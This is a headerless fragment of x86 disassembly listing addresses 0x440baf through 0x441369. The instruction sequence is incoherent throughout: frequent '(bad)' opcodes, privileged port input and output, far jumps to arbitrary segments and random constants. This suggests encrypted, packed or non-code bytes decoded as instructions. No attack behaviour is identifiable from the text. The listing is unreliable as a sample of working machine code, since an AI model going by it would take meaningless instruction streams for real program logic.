  440baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440bb0:	jne    0x440c0a
  440bb2:	push   ss
  440bb3:	out    0x30,eax
  440bb5:	mov    bh,BYTE PTR [eax]
  440bb7:	out    0x18,eax
  440bb9:	sub    ebx,ebp
  440bbb:	xchg   ebx,eax
  440bbc:	add    DWORD PTR [edx+0x6a],0xed76ab18
  440bc3:	adc    DWORD PTR [ebx+ebx*4-0x4d],ebx
  440bc7:	fsubp  st(3),st
  440bc9:	push   ebx
  440bca:	clc    
  440bcb:	call   FWORD PTR [edi]
  440bcd:	cdq    
  440bce:	dec    edi
  440bcf:	xor    dh,cl
  440bd1:	fiadd  DWORD PTR [edi]
  440bd3:	cmc    
  440bd4:	int    0x38
  440bd6:	jg     0x440be1
  440bd8:	and    ebx,ecx
  440bda:	xchg   esi,eax
  440bdb:	jecxz  0x440b85
  440bdd:	jp     0x440b9c
  440bdf:	xchg   ebx,eax
  440be0:	push   ss
  440be1:	jmp    0xbc9dc4dd
  440be6:	daa    
  440be7:	popa   
  440be8:	push   esi
  440be9:	lahf   
  440bea:	sbb    ecx,DWORD PTR [edx]
  440bec:	mov    dh,0xf1
  440bee:	sar    esp,1
  440bf0:	mov    dh,0x57
  440bf2:	lods   eax,DWORD PTR ds:[esi]
  440bf3:	xchg   ebp,eax
  440bf4:	sbb    eax,0xddb69e56
  440bf9:	ss mov ebp,0xcc949138
  440bff:	jmp    0x78ac:0x973a6fec
  440c06:	mov    ebx,0xdf98bdf2
  440c0b:	aam    0x32
  440c0d:	popf   
  440c0e:	cmp    edi,DWORD PTR [ecx+0x54a9fbfe]
  440c14:	xor    edi,DWORD PTR [ecx+0x7c]
  440c17:	xchg   ebp,eax
  440c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440c19:	inc    ecx
  440c1a:	sbb    DWORD PTR [edi],esi
  440c1c:	mov    esp,DWORD PTR [esi+0x8140129]
  440c22:	xchg   esp,eax
  440c23:	outs   dx,BYTE PTR ds:[esi]
  440c24:	xchg   ebx,eax
  440c25:	cdq    
  440c26:	or     ebp,DWORD PTR [esi+0x7c]
  440c29:	in     eax,dx
  440c2a:	in     eax,0xe8
  440c2c:	xor    al,0xb3
  440c2e:	add    ebp,ecx
  440c30:	jno    0x440bca
  440c32:	mov    bl,0x44
  440c34:	xor    al,0x30
  440c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440c37:	pop    edx
  440c38:	test   DWORD PTR [edx],ecx
  440c3a:	dec    ebx
  440c3b:	call   0x184b0206
  440c40:	sbb    al,0xb9
  440c42:	popa   
  440c43:	cmp    esp,DWORD PTR [edx]
  440c45:	mov    cl,BYTE PTR [esi+eax*1+0x3daba187]
  440c4c:	icebp  
  440c4d:	mov    cl,0x17
  440c4f:	in     eax,0x5b
  440c51:	in     eax,0x3e
  440c53:	and    al,0x1
  440c55:	add    eax,0x9fec74b6
  440c5a:	in     al,dx
  440c5b:	repnz fld DWORD PTR es:[esi+0x7eea0524]
  440c63:	retf   0x360f
  440c66:	mov    dl,0x70
  440c68:	popa   
  440c69:	mov    eax,ds:0xcca3684a
  440c6e:	scas   eax,DWORD PTR es:[edi]
  440c6f:	xchg   ebp,eax
  440c70:	and    edi,DWORD PTR [ecx]
  440c72:	and    al,0xe1
  440c74:	sub    BYTE PTR [esi-0x372aeaf2],ah
  440c7a:	(bad)  
  440c7b:	in     eax,dx
  440c7c:	jo     0x440ceb
  440c7e:	or     BYTE PTR [esi+0x9],bl
  440c81:	cli    
  440c82:	lods   al,BYTE PTR ds:[esi]
  440c83:	sub    al,0xb9
  440c85:	popf   
  440c86:	jmp    0x5eec7024
  440c8b:	iret   
  440c8c:	push   es
  440c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440c8e:	fldenv [eax]
  440c90:	jp     0x440cae
  440c92:	xchg   edi,eax
  440c93:	imul   esi,DWORD PTR [ecx+0x25],0xffffffb6
  440c97:	lods   eax,DWORD PTR ds:[esi]
  440c98:	mov    fs,WORD PTR [esi]
  440c9a:	sub    eax,ebp
  440c9c:	es jle 0x440c6b
  440c9f:	mov    bh,0x1f
  440ca1:	sub    BYTE PTR ds:0x4ecf650b,ch
  440ca7:	out    dx,eax
  440ca8:	shl    BYTE PTR [eax-0x13],1
  440cab:	gs dec esi
  440cad:	cdq    
  440cae:	dec    esp
  440caf:	je     0x440c90
  440cb1:	xchg   edx,eax
  440cb2:	mov    ebp,0xf77cde3d
  440cb7:	ins    BYTE PTR es:[edi],dx
  440cb8:	jbe    0x440cd1
  440cba:	cs int 0xed
  440cbd:	fs pop es
  440cbf:	fild   DWORD PTR [ecx+0x2b6cdcd9]
  440cc5:	xchg   ecx,eax
  440cc6:	or     al,ch
  440cc8:	mov    ebp,0x229b38e1
  440ccd:	sbb    DWORD PTR [ecx],edi
  440ccf:	out    0x67,eax
  440cd1:	push   0x2d
  440cd3:	adc    al,0x8c
  440cd5:	mov    ds:0xdb19cffb,eax
  440cda:	sbb    BYTE PTR [esi],ch
  440cdc:	loop   0x440d02
  440cde:	mov    ?,WORD PTR [eax+0x67]
  440ce1:	ds mov dh,0x14
  440ce4:	dec    ebp
  440ce5:	mov    ebp,DWORD PTR [eax-0x79884a29]
  440ceb:	out    0x37,eax
  440ced:	mov    ?,WORD PTR [ebx]
  440cef:	push   0x5d4820b5
  440cf4:	ret    
  440cf5:	adc    ah,bl
  440cf7:	hlt    
  440cf8:	mov    ah,0xa4
  440cfa:	pop    ss
  440cfb:	sbb    BYTE PTR [esi-0x23f17460],cl
  440d01:	(bad)  
  440d03:	out    0x33,al
  440d05:	mov    ds:0xa8342f39,eax
  440d0a:	mov    esp,0x97d4fde4
  440d0f:	ret    0x2a87
  440d12:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  440d14:	cmp    DWORD PTR [eax-0x4b],eax
  440d17:	icebp  
  440d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440d19:	out    dx,eax
  440d1a:	out    dx,al
  440d1b:	or     dh,BYTE PTR [ecx+ecx*2]
  440d1e:	pop    edi
  440d1f:	xor    esi,DWORD PTR [ebx-0x62f63018]
  440d25:	in     eax,0x67
  440d27:	xchg   ebx,eax
  440d28:	data16 cmp BYTE PTR [eax-0x35c97ab],bh
  440d2f:	je     0x440d78
  440d31:	inc    ebx
  440d32:	lahf   
  440d33:	mov    ch,0x77
  440d35:	nop
  440d36:	mov    cl,0x34
  440d38:	retf   0x271d
  440d3b:	mov    ebp,0xe791c425
  440d40:	rcl    esp,1
  440d42:	fcmove st,st(1)
  440d44:	scas   eax,DWORD PTR es:[edi]
  440d45:	or     al,0x30
  440d47:	shl    BYTE PTR [ebp-0x44],cl
  440d4a:	scas   al,BYTE PTR es:[edi]
  440d4b:	out    dx,eax
  440d4c:	sbb    BYTE PTR [ecx+ebp*8+0x74],dh
  440d50:	test   DWORD PTR [ebx+0x35a3ed82],esi
  440d56:	xchg   ecx,eax
  440d57:	cmp    edx,DWORD PTR [esi]
  440d59:	imul   edi,DWORD PTR [edx+0x7e],0x4bb87d46
  440d60:	shld   DWORD PTR [ebx],edi,0x63
  440d64:	adc    DWORD PTR [ebx+edx*4+0x3],0xe5b280e7
  440d6c:	adc    bh,BYTE PTR [esi-0x56b00b50]
  440d72:	push   edi
  440d73:	and    eax,ebp
  440d75:	xchg   ebx,eax
  440d76:	push   ebp
  440d77:	in     eax,dx
  440d78:	(bad)
  440d7b:	add    eax,0x94ac5920
  440d80:	stos   DWORD PTR es:[edi],eax
  440d81:	jp     0x440d56
  440d83:	rcr    DWORD PTR [ebx+0x17],1
  440d86:	ins    BYTE PTR es:[edi],dx
  440d87:	or     al,0xb1
  440d89:	dec    esi
  440d8a:	fsub   QWORD PTR [ecx+edx*2+0x4ff25421]
  440d91:	cmp    bl,BYTE PTR [edx+0x781923c8]
  440d97:	cmp    eax,0x53c09c3d
  440d9c:	lods   eax,DWORD PTR ds:[esi]
  440d9d:	lahf   
  440d9e:	retf   
  440d9f:	(bad)  
  440da0:	call   0xfd90:0xe14a4b26
  440da7:	jmp    0xf4fb270f
  440dac:	lea    edi,[eax+ebp*8-0x17]
  440db0:	adc    eax,0x66ae1d26
  440db5:	sbb    al,0xe5
  440db7:	jne    0x440dd2
  440db9:	sbb    esi,edi
  440dbb:	cli    
  440dbc:	jbe    0x440e32
  440dbe:	leave  
  440dbf:	inc    edi
  440dc0:	cld    
  440dc1:	push   0xb923705f
  440dc6:	xchg   esi,eax
  440dc7:	sahf   
  440dc8:	repnz (bad) 
  440dca:	test   al,0xff
  440dcc:	sbb    edi,DWORD PTR [ecx-0x48]
  440dcf:	pop    ss
  440dd0:	mov    bh,0x92
  440dd2:	daa    
  440dd3:	in     eax,0x6c
  440dd5:	adc    cl,BYTE PTR [esp+edx*2+0x3]
  440dd9:	push   ecx
  440dda:	cli    
  440ddb:	mov    ecx,0xeba64f16
  440de0:	pop    ss
  440de1:	imul   ebp,DWORD PTR [edx+0x21],0x2862da02
  440de8:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440dea:	sti    
  440deb:	cmp    al,0x49
  440ded:	sbb    DWORD PTR [esi-0x48d86bea],0x2187f02c
  440df7:	sbb    bh,BYTE PTR gs:[ecx]
  440dfa:	pop    ds
  440dfb:	lds    edx,FWORD PTR ds:0xb0e16ba8
  440e01:	in     al,dx
  440e02:	sahf   
  440e03:	adc    DWORD PTR [esi+0xb],eax
  440e06:	jb     0x440dc5
  440e08:	pop    ebx
  440e09:	sar    DWORD PTR [edx+0x5c94d3b4],1
  440e0f:	mov    ss,WORD PTR [ebx+0x77]
  440e12:	xor    ebp,edx
  440e14:	cmc    
  440e15:	add    esp,DWORD PTR [eax]
  440e17:	icebp  
  440e18:	push   esp
  440e19:	cmp    dh,BYTE PTR [ebx+0x725a85ed]
  440e1f:	push   edx
  440e20:	and    edi,DWORD PTR [ecx-0x162494b7]
  440e26:	jb     0x440e6e
  440e28:	xchg   ebp,eax
  440e29:	mov    ecx,DWORD PTR [ebp-0xc]
  440e2c:	jge    0x440e7e
  440e2e:	xor    DWORD PTR [ecx-0x606516e1],0x49701050
  440e38:	mov    esp,0x99620bc0
  440e3d:	fbld   TBYTE PTR [edi+0x10]
  440e40:	sbb    esi,ebp
  440e42:	and    eax,0x1b80f250
  440e47:	cmc    
  440e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440e49:	sub    al,0xc2
  440e4b:	mov    ah,0x4e
  440e4d:	sahf   
  440e4e:	mov    ebp,?
  440e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440e51:	cdq    
  440e52:	mov    ebx,0x93979737
  440e57:	adc    dh,dl
  440e59:	in     al,0x3b
  440e5b:	xor    al,BYTE PTR [edx+0x49f4bed0]
  440e61:	and    eax,0xb01539d7
  440e66:	pop    ebp
  440e67:	jmp    0x440eaf
  440e69:	pop    ebx
  440e6a:	gs mov dl,0x17
  440e6d:	fnstcw WORD PTR [ebp-0x3e13ee88]
  440e73:	jl     0x440eeb
  440e75:	adc    cl,ah
  440e77:	shl    DWORD PTR [ebx+0x7d],0x27
  440e7b:	stos   BYTE PTR es:[edi],al
  440e7c:	popa   
  440e7d:	in     eax,dx
  440e7e:	shr    ch,cl
  440e80:	mov    cl,0xac
  440e82:	in     eax,0x1c
  440e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440e85:	add    BYTE PTR [esi-0x17],0x28
  440e89:	test   eax,0x53857234
  440e8e:	scas   al,BYTE PTR es:[edi]
  440e8f:	std    
  440e90:	cld    
  440e91:	adc    DWORD PTR [ecx+0x6a7d54e0],esp
  440e97:	test   eax,0xc89399e0
  440e9c:	repnz cmp esp,DWORD PTR [esi]
  440e9f:	and    ch,bh
  440ea1:	add    al,0xa3
  440ea3:	jl     0x440eea
  440ea5:	pushf  
  440ea6:	xchg   ebx,ebp
  440ea8:	inc    ebx
  440ea9:	pop    esi
  440eaa:	lods   eax,DWORD PTR ds:[esi]
  440eab:	pop    es
  440eac:	or     BYTE PTR [ebx-0x1],ch
  440eaf:	(bad)  
  440eb0:	sbb    DWORD PTR [ebp+0x1c010faa],esp
  440eb6:	data16 xor ah,BYTE PTR ds:0x8defde39
  440ebd:	sbb    eax,0xd91cab02
  440ec2:	aas    
  440ec3:	pop    ss
  440ec4:	in     eax,dx
  440ec5:	mov    ebp,0xa0d3594b
  440eca:	cmp    esp,DWORD PTR [ebx+0xe]
  440ecd:	das    
  440ece:	and    al,BYTE PTR [ecx]
  440ed0:	mov    ch,0xf4
  440ed2:	rcr    DWORD PTR [ecx],1
  440ed4:	stos   BYTE PTR es:[edi],al
  440ed5:	or     BYTE PTR [esi+0x26cdf284],bh
  440edb:	not    DWORD PTR ds:0x3cf21f31
  440ee1:	lock mov edi,0x2bb91e72
  440ee7:	xor    BYTE PTR ds:0xed5edeb1,bh
  440eed:	rcr    DWORD PTR [ebx+0x16],1
  440ef0:	leave  
  440ef1:	xchg   DWORD PTR [ebp+0x7d],esi
  440ef4:	cdq    
  440ef5:	mov    dh,0xc3
  440ef7:	cmp    DWORD PTR [eax],ebx
  440ef9:	(bad)  
  440efb:	xor    eax,0x37bffd9d
  440f00:	int3   
  440f01:	pushf  
  440f02:	mov    ebx,0x88f41122
  440f07:	lods   al,BYTE PTR ds:[esi]
  440f08:	dec    ebp
  440f09:	mov    ds:0xe3378f11,al
  440f0e:	mov    esp,0x18a814
  440f13:	stc    
  440f14:	cmc    
  440f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440f16:	mov    al,ds:0x5f52c3ea
  440f1b:	test   eax,0x9a4c391f
  440f20:	dec    ebp
  440f21:	and    edi,esp
  440f23:	outs   dx,DWORD PTR ds:[esi]
  440f24:	jae    0x440eac
  440f26:	xor    ecx,DWORD PTR [eax+0x75]
  440f29:	and    cl,BYTE PTR [eax+ebp*8+0x31c9ce0]
  440f30:	and    bl,BYTE PTR [ecx]
  440f32:	gs add al,0x8f
  440f35:	inc    esi
  440f36:	cdq    
  440f37:	or     ebp,DWORD PTR [eax]
  440f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440f3a:	sti    
  440f3b:	out    dx,al
  440f3c:	dec    ebp
  440f3d:	aaa    
  440f3e:	into   
  440f3f:	xor    eax,0x72bdd4a5
  440f44:	jbe    0x440f93
  440f46:	mov    dl,0xa4
  440f48:	outs   dx,BYTE PTR ds:[esi]
  440f49:	xlat   BYTE PTR ds:[ebx]
  440f4a:	cmp    dh,bh
  440f4c:	mov    ch,0xe4
  440f4e:	inc    ebp
  440f4f:	hlt    
  440f50:	or     edi,ebx
  440f52:	add    al,0x7a
  440f54:	and    BYTE PTR [ecx],bh
  440f56:	adc    dl,BYTE PTR [eax-0x4cd3425b]
  440f5c:	and    BYTE PTR [edi+0x6c28e26b],0xa8
  440f63:	cmp    DWORD PTR [ebx+ebx*2+0xa30f604],0xffffffbe
  440f6b:	hlt    
  440f6c:	push   0x9d2974e7
  440f71:	or     cl,BYTE PTR [edi+edi*2-0x4a]
  440f75:	rcr    DWORD PTR [ebx-0x66],1
  440f78:	push   ds
  440f79:	and    al,0xf0
  440f7b:	repnz cwde 
  440f7d:	(bad)  
  440f7e:	mov    ecx,0x39569590
  440f83:	hlt    
  440f84:	add    bl,BYTE PTR [eax-0x75]
  440f87:	dec    ebx
  440f88:	push   edi
  440f89:	(bad)  
  440f8a:	cdq    
  440f8b:	retf   
  440f8c:	aad    0xa0
  440f8e:	in     eax,dx
  440f8f:	out    0xd4,eax
  440f91:	aam    0x18
  440f93:	push   0x22
  440f95:	jmp    0xd9d792b8
  440f9a:	dec    esp
  440f9b:	test   DWORD PTR [eax+eiz*4+0x6b],edi
  440f9f:	mov    cl,0xaf
  440fa1:	inc    esp
  440fa2:	iret   
  440fa3:	clc    
  440fa4:	js     0x440fa2
  440fa6:	aaa    
  440fa7:	(bad)  
  440fa8:	loope  0x440fd8
  440faa:	mov    dh,0xd4
  440fac:	imul   BYTE PTR [edx]
  440fae:	jb     0x440f46
  440fb0:	and    eax,0xdaf010f1
  440fb5:	xchg   ebp,eax
  440fb6:	push   ebx
  440fb7:	sub    eax,0xab79d916
  440fbc:	dec    edx
  440fbd:	cmp    DWORD PTR [ecx-0x4603e7f],esi
  440fc3:	and    BYTE PTR [ecx+0x66],bh
  440fc6:	fcos   
  440fc8:	dec    ebp
  440fc9:	pusha  
  440fca:	dec    esi
  440fcb:	shl    edx,0x14
  440fce:	xor    dh,0x1e
  440fd1:	call   0x8395:0x16f344e2
  440fd8:	mov    eax,ds:0x91f0fbac
  440fdd:	push   edi
  440fde:	repnz pop eax
  440fe0:	retf   0x7ea8
  440fe3:	mov    ebx,0x6f9fe924
  440fe8:	test   eax,0xdded40dd
  440fed:	int    0x2b
  440fef:	and    DWORD PTR [ebx+0x2c56b5d0],ecx
  440ff5:	xchg   ecx,eax
  440ff6:	aad    0x5a
  440ff8:	inc    ebx
  440ff9:	adc    DWORD PTR [ecx],ebx
  440ffb:	jb     0x441016
  440ffd:	leave  
  440ffe:	cmp    eax,eax
  441000:	mov    edi,DWORD PTR [edx+0x40]
  441003:	fistp  DWORD PTR [ecx]
  441005:	xlat   BYTE PTR ds:[ebx]
  441006:	retf   
  441007:	xor    al,0x31
  441009:	cld    
  44100a:	mov    esp,0x6862c675
  44100f:	mov    BYTE PTR [edx-0x54],dl
  441012:	xor    al,0x12
  441014:	pop    ecx
  441015:	mov    ebp,0xafd1d4bc
  44101a:	cdq    
  44101b:	sub    dl,BYTE PTR ds:0x9ce84e63
  441021:	mov    edx,0x1addb00f
  441026:	jmp    0x3b3e:0x66b92f2b
  44102d:	sbb    ch,al
  44102f:	stc    
  441030:	sbb    eax,0x3936bbd7
  441035:	(bad)  
  441037:	inc    eax
  441038:	sub    dl,BYTE PTR [edi-0x5c8b77e9]
  44103e:	repnz gs mov al,0x67
  441042:	mov    dl,0x74
  441044:	mov    bl,0x31
  441046:	pop    ebp
  441047:	into   
  441048:	aad    0x46
  44104a:	cdq    
  44104b:	call   0x76c8f883
  441050:	xor    ecx,ebx
  441052:	jmp    0x441044
  441054:	add    DWORD PTR [eax-0xc],edx
  441057:	cdq    
  441058:	sbb    al,0x6
  44105a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44105b:	cwde   
  44105c:	aaa    
  44105d:	jb     0x441064
  44105f:	ret    0xa2d5
  441062:	repz out dx,al
  441064:	mov    cs,WORD PTR [esi-0x48]
  441067:	mov    bl,0x54
  441069:	xchg   DWORD PTR [ebx-0x29],esi
  44106c:	fcomp  QWORD PTR [edi-0x4f]
  44106f:	aam    0x42
  441071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441072:	pop    ebx
  441073:	jecxz  0x44107f
  441075:	pop    ebx
  441076:	sub    ch,BYTE PTR [esi]
  441078:	sub    edx,esi
  44107a:	daa    
  44107b:	test   al,0x1d
  44107d:	(bad)  
  44107e:	rol    BYTE PTR [ecx+eiz*1],0xee
  441082:	cmp    edx,DWORD PTR [esi-0x19445e1d]
  441088:	or     ah,BYTE PTR [ebx+0x5dd10b21]
  44108e:	pop    ebp
  44108f:	fsub   DWORD PTR [ebx+0x7e]
  441092:	out    dx,eax
  441093:	hlt    
  441094:	mov    ds:0xf683e617,al
  441099:	mov    ds:0x101e7a6b,al
  44109e:	mov    ah,0xb7
  4410a0:	inc    edi
  4410a1:	cmp    esi,esp
  4410a3:	mov    cl,0x71
  4410a5:	in     eax,0x19
  4410a7:	icebp  
  4410a8:	mov    dl,0x81
  4410aa:	loopne 0x4410b5
  4410ac:	imul   edx,DWORD PTR [eax+0x72f2f4bf],0x135932b
  4410b6:	add    edi,esp
  4410b8:	mov    WORD PTR [ecx-0xc],ss
  4410bb:	and    BYTE PTR ds:0xa65aad69,bl
  4410c1:	int3   
  4410c2:	stos   DWORD PTR es:[edi],eax
  4410c3:	(bad)  
  4410c4:	fsub   QWORD PTR [ebx+ecx*2-0x45437a9c]
  4410cb:	nop
  4410cc:	fcom   QWORD PTR [eax+0x3b]
  4410cf:	xor    al,0x78
  4410d1:	dec    esi
  4410d2:	xchg   dh,dh
  4410d4:	mov    al,0xe9
  4410d6:	mov    ebp,0x94a61624
  4410db:	mov    es,ebp
  4410dd:	stos   BYTE PTR es:[edi],al
  4410de:	cmp    esp,ebp
  4410e0:	cli    
  4410e1:	rcl    BYTE PTR [esi-0x4a],1
  4410e4:	pop    ds
  4410e5:	jmp    0x406a2cbd
  4410ea:	cli    
  4410eb:	shl    DWORD PTR [ecx-0x71],1
  4410ee:	mov    ebp,0x27e1cc32
  4410f3:	mov    ds:0x8f79caa,al
  4410f8:	in     al,0xa9
  4410fa:	cmp    al,0xae
  4410fc:	iret   
  4410fd:	repnz mov edi,0xf84d8aa4
  441103:	int    0x94
  441105:	mov    BYTE PTR [ebp+0x37a80dad],cl
  44110b:	pop    es
  44110c:	jp     0x4410a0
  44110e:	imul   esi,edi,0x1b
  441111:	pop    ecx
  441112:	pop    eax
  441113:	cli    
  441114:	lock in eax,0x5e
  441117:	out    0x3c,eax
  441119:	mov    ds:0x4e15972b,al
  44111e:	out    0x8,al
  441120:	push   ebp
  441121:	dec    edi
  441122:	not    DWORD PTR [esi+eiz*8-0x6b9b3a44]
  441129:	sti    
  44112a:	popa   
  44112b:	mov    dl,0xf9
  44112d:	cdq    
  44112e:	jnp    0x441182
  441130:	pop    edi
  441131:	sbb    bl,cl
  441133:	gs dec esi
  441135:	mov    bl,0xbb
  441137:	sub    DWORD PTR [esi+esi*4-0x47],0xea387c64
  44113f:	inc    esp
  441140:	xchg   ebp,eax
  441141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441142:	fwait
  441143:	retf   0x1feb
  441146:	xchg   ebx,eax
  441147:	push   0x59627b0b
  44114c:	lea    ecx,[edx]
  44114e:	sbb    BYTE PTR [esi-0x59],dl
  441151:	aas    
  441152:	mov    al,0x94
  441154:	ins    BYTE PTR es:[edi],dx
  441155:	lds    ebx,FWORD PTR [ebx-0x19]
  441158:	cdq    
  441159:	ret    
  44115a:	sbb    BYTE PTR [ecx-0x2e342ae8],dl
  441160:	sbb    eax,0x7c1b18e9
  441165:	inc    ebx
  441166:	jbe    0x44118d
  441168:	jp     0x441103
  44116a:	cmp    eax,DWORD PTR [edx+0x2b9cf19b]
  441170:	or     dh,BYTE PTR [esi-0x20522155]
  441176:	mov    cl,0x24
  441178:	cmp    BYTE PTR [esp+edi*1+0x6ba15023],bl
  44117f:	repz sub bl,BYTE PTR [edi]
  441182:	scas   eax,DWORD PTR es:[edi]
  441183:	arpl   WORD PTR [edx],di
  441185:	inc    edi
  441186:	sbb    ch,BYTE PTR [esi+0x752b633c]
  44118c:	and    DWORD PTR [eax-0x5c98941b],ecx
  441192:	(bad)  [ecx-0x7d]
  441195:	jmp    DWORD PTR ds:0x96b0e924
  44119b:	jb     0x441219
  44119d:	mov    cl,0x30
  44119f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4411a0:	add    BYTE PTR [ebx+edi*4+0x343bd917],bl
  4411a7:	mov    al,0x81
  4411a9:	out    dx,eax
  4411aa:	mov    dl,0x7b
  4411ac:	out    dx,eax
  4411ad:	and    BYTE PTR [ebx-0x41cefaac],bh
  4411b3:	jge    0x44116c
  4411b5:	xchg   ebp,eax
  4411b6:	mov    edi,0xf27429d9
  4411bb:	out    dx,al
  4411bc:	sti    
  4411bd:	inc    ecx
  4411be:	push   es
  4411bf:	or     eax,DWORD PTR [edx]
  4411c1:	dec    edi
  4411c2:	mov    ah,0xd4
  4411c4:	stos   BYTE PTR es:[edi],al
  4411c5:	into   
  4411c6:	sbb    DWORD PTR [edx-0xe86705b],esp
  4411cc:	mov    cl,BYTE PTR [esi+edi*2]
  4411cf:	cli    
  4411d0:	and    DWORD PTR [ecx+0x5b6c36d6],ebp
  4411d6:	xchg   DWORD PTR [edx+0xe0b9dd5],edi
  4411dc:	repz mov edx,0x3c547613
  4411e2:	add    al,0xdc
  4411e4:	stos   BYTE PTR es:[edi],al
  4411e5:	lds    edi,FWORD PTR [eax+ebx*2+0x21]
  4411e9:	or     DWORD PTR [esi-0x7d],ebx
  4411ec:	pop    ebp
  4411ed:	and    al,0xeb
  4411ef:	mov    WORD PTR ds:0xf9ec3503,ss
  4411f5:	xchg   ebx,eax
  4411f6:	sub    al,0x4
  4411f8:	or     BYTE PTR [ecx],dh
  4411fa:	cmp    al,0xd5
  4411fc:	pop    edx
  4411fd:	jge    0x44122c
  4411ff:	push   es
  441200:	and    DWORD PTR [ecx+0x32],ebp
  441203:	sub    DWORD PTR [ebp+0x1d10d8ee],0xffffffe9
  44120a:	ins    DWORD PTR es:[edi],dx
  44120b:	and    eax,0xc6f5833
  441210:	(bad)  
  441211:	jl     0x4411e1
  441213:	js     0x44126a
  441215:	mov    gs,edi
  441217:	fist   DWORD PTR [edx+0x394bb5c]
  44121d:	or     al,0x44
  44121f:	mov    dh,0x9e
  441221:	btr    DWORD PTR [esp+edi*8-0x4a00299f],eax
  441229:	and    DWORD PTR [ecx],0xffffffef
  44122c:	xchg   BYTE PTR ds:0x906b3208,cl
  441232:	jns    0x441251
  441234:	cmp    BYTE PTR [eax+0x1ec8f4ec],dh
  44123a:	sbb    BYTE PTR [ebx+0x4f],dl
  44123d:	mov    ds:0x88bed1eb,al
  441242:	mov    cl,0xb7
  441244:	js     0x4412bb
  441246:	sti    
  441247:	aad    0x64
  441249:	adc    dh,BYTE PTR [ebp-0x3b43b7ac]
  44124f:	mov    esi,0x1de0f9c3
  441255:	ret    
  441256:	pop    ebp
  441257:	fcmovnb st,st(4)
  441259:	loopne 0x44121b
  44125b:	jge    0x44128b
  44125d:	jg     0x441218
  44125f:	xor    al,0x45
  441261:	jp     0x4412a3
  441263:	xchg   ch,ch
  441265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441266:	sbb    edi,DWORD PTR [ebx+0x7280374a]
  44126c:	and    cl,ah
  44126e:	cwde   
  44126f:	gs jle 0x441212
  441272:	add    eax,DWORD PTR [eax-0x7622f57f]
  441278:	or     DWORD PTR ss:[edx],0x1a
  44127c:	jmp    0x37b5:0x5288a25
  441283:	xor    bl,BYTE PTR [ecx+0x1f]
  441286:	mov    ah,0xf4
  441288:	mov    ebp,0x45310c19
  44128d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44128e:	jb     0x441284
  441290:	add    edi,DWORD PTR [ebx+eiz*4]
  441293:	in     al,0x21
  441295:	or     DWORD PTR [eax-0x3be7f6e5],esp
  44129b:	and    al,0xc
  44129d:	mov    eax,ds:0x3527578b
  4412a2:	mov    ebp,0x3320e1c7
  4412a7:	xor    BYTE PTR [ebx+edx*8-0x5e8a3b44],bh
  4412ae:	ror    BYTE PTR [ebx-0x5b],1
  4412b1:	sub    al,0xdb
  4412b3:	stc    
  4412b4:	inc    esi
  4412b5:	and    BYTE PTR [ebx],bl
  4412b7:	repz jb 0x4412b6
  4412ba:	int3   
  4412bb:	sub    esi,esp
  4412bd:	add    bh,BYTE PTR [esp+esi*8-0x451c3c97]
  4412c4:	mov    ch,0xf4
  4412c6:	imul   ebp,eax,0xffffff96
  4412c9:	stos   DWORD PTR es:[edi],eax
  4412ca:	inc    esi
  4412cb:	pop    ds
  4412cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4412cd:	lods   al,BYTE PTR ds:[esi]
  4412ce:	shl    BYTE PTR [ebp+0x3b0dc935],cl
  4412d4:	push   edi
  4412d5:	adc    al,0x68
  4412d7:	mov    ah,0x2e
  4412d9:	sbb    BYTE PTR [edi-0x2a],cl
  4412dc:	and    DWORD PTR [eax-0x5ebd2d05],esp
  4412e2:	cdq    
  4412e3:	push   0x22
  4412e5:	xchg   ebx,eax
  4412e6:	pop    ss
  4412e7:	retf   
  4412e8:	inc    ecx
  4412e9:	ret    
  4412ea:	mov    al,0x4
  4412ec:	dec    ebx
  4412ed:	mov    esp,0xa6dd6d17
  4412f2:	cmp    ebx,DWORD PTR [edi]
  4412f4:	or     cl,bh
  4412f6:	mov    eax,0xd0478318
  4412fb:	shl    WORD PTR [edi],cl
  4412fe:	mov    eax,0xd1349f44
  441303:	dec    ebp
  441304:	in     eax,0x29
  441306:	xchg   edi,eax
  441307:	out    0x4b,eax
  441309:	mov    edx,0x79214098
  44130e:	jl     0x44132c
  441310:	pop    esp
  441311:	aam    0xf3
  441313:	stc    
  441314:	sbb    ebx,DWORD PTR [edx+0x7caca19b]
  44131a:	push   ds
  44131b:	add    dh,BYTE PTR [edi-0x17]
  44131e:	test   DWORD PTR [esi+0x25],esi
  441321:	pop    ecx
  441322:	jg     0x4412f0
  441324:	sbb    al,0x3e
  441326:	mov    eax,0x4f4ba0ef
  44132c:	adc    eax,esi
  44132e:	or     esi,DWORD PTR [ecx]
  441330:	inc    ebx
  441331:	ror    DWORD PTR [edi-0x15],1
  441334:	fwait
  441335:	sbb    edx,eax
  441337:	add    al,0x19
  441339:	add    dl,ch
  44133b:	iret   
  44133c:	add    eax,0x4a38882
  441341:	push   0x92936b65
  441346:	mov    al,0x42
  441348:	and    al,0x59
  44134a:	es sub dl,al
  44134d:	sahf   
  44134e:	ror    BYTE PTR [edi+0x7f],1
  441351:	popf   
  441352:	mov    ebx,0x5a0bb783
  441357:	in     eax,dx
  441358:	fild   DWORD PTR [edi+0x4d]
  44135b:	les    ecx,FWORD PTR [edx+0x610c8da9]
  441361:	xchg   ebp,eax
  441362:	icebp  
  441363:	sbb    al,BYTE PTR [edi]
  441365:	ds mov al,0x11
  441368:	cmc    
  441369:	add    edx,edi
